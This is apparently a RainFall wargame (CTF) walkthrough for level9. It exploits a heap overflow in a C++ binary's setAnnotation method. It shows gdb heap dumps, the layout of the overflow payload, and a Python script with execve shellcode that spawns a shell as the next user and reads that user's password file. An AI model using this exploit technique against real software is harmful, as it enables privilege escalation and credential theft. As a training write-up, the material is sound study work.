# Level9
Level9 requires us to exploit a CPP binary.

# Tools

# Walkthrough

The home of level9 contains a CPP binary, `level9`. We decompile it with dogbolt and get a few interesting elements.
First, there is a main function:
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
	N *v3; // ebx
	N *v4; // ebx
	N *v6; // [esp+1Ch] [ebp-8h]

	if ( argc <= 1 )
	_exit(1);
	v3 = (N *)operator new(0x6Cu);
	N::N(v3, 5);
	v6 = v3;
	v4 = (N *)operator new(0x6Cu);
	N::N(v4, 6);
	N::setAnnotation(v6, (char *)argv[1]);
	return (**(int (__cdecl ***)(N *, N *))v4)(v4, v6);
}
```
The `operator new` will allocated raw memory on the heap, `0x6C` = 108.

Where N is a CPP class. The `setAnnotation` method:
```cpp
void *__cdecl N::setAnnotation(N *this, char *s)
{
	size_t v2; // eax

	v2 = strlen(s);
	return memcpy((char *)this + 4, s, v2);
}
```
The `memcpy` function copies the content of `argv[2]`.
As we allocated 108 bytes, and we `memcpy` writes to the allocated space without checking the bounds, we can try to heap buffer overflow and hijack process execution flow by overwriting the return address.

Let's exploit now.
```
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
```
We break at `0x0804867c`, the return address of `setAnnotation`. 
```
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) r AAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAA
```
We run the payload with many `A`s to find the start of the buffer.

Get the address of the heap with `info proc mappings`
```
Breakpoint 1, 0x0804867c in main ()
(gdb) info proc mappings
process 4426
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7cfa000 0xb7cfc000     0x2000        0x0
	0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d46000 0xb7d47000     0x1000        0x0
	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eed000 0xb7ef0000     0x3000        0x0
	0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fce000 0xb7fd5000     0x7000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```
The address is `0x804a000`.
We get the first 20 double words, and see our `A` (`A` = `0x41`).
The start of the buffer is `0x804a000` + 4 + 4 + 4 = `0x804a00c`.
```
(gdb) x/20dx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
```

Now, let's confirm that we can make the program crash by segfaulting it (the binary prints nothing if no problem):
```
level9@RainFall:~$ ./level9 $(python -c 'print "A"*108')
level9@RainFall:~$ ./level9 $(python -c 'print "A"*109')
Segmentation fault (core dumped)
```
Contrary to the previous levels, there are no given method to get the access no flag (no `cat`, no `system` call...)
So let's try to input a shellcode, and put the buffer address after the segfault to overwrite the return address.

Content of the heap when overflowing 108:
```
(gdb) x/80wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a070:	0x41414141	0x41414141	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
```

Content of the heap when overflowing 112:
```
(gdb) x/80wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a070:	0x41414141	0x41414141	0x41414141	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
```
The return address is overwritten. 

We use that [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html) from kernel_panik. 

```
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
```
As you can see, the main dereferences the content stored at `edx`, so instead of directly passing the shell code, we need to pass the address of the shell.
So, to make it clearer:
1. We buffer overflow in `memcopy` to overwrite the return address
2. We overwrite the return address by the address of the start of the buffer
3. The program dereferences the content of `edx`, and calls the pointed address, which is going to be the address of the start of the shellcode (the address of the buffer + the 4 bytes for the written address of the shellcode)
4. The program executes the shellcode

Thus, the payload is in the form of:
```
[SHELL ADDRESS] + [SHELL CODE] + [PADDING] + [BUFFER ADDRESS]
```

The shell address is the buffer address + the size of an address, 4 bytes. So shell address = `0x804a00c` + 4 = `0x804a010`

We now have a shellcode, a buffer length, the buffer address and our shell address, let's make our payload:
```py
len_buffer = 108
shell_address=b"\x10\xa0\x04\x08"
shell_code = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
return_address = b"\x0c\xa0\x04\x08"

payload = (
	shell_address +
    shell_code +
    b"A" * (len_buffer - len(shell_code) - len(shell_address)) +
    return_address
)

print(payload)
```

We run the binary with our script:
```
level9@RainFall:~$ ./level9 $(python script.py)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
```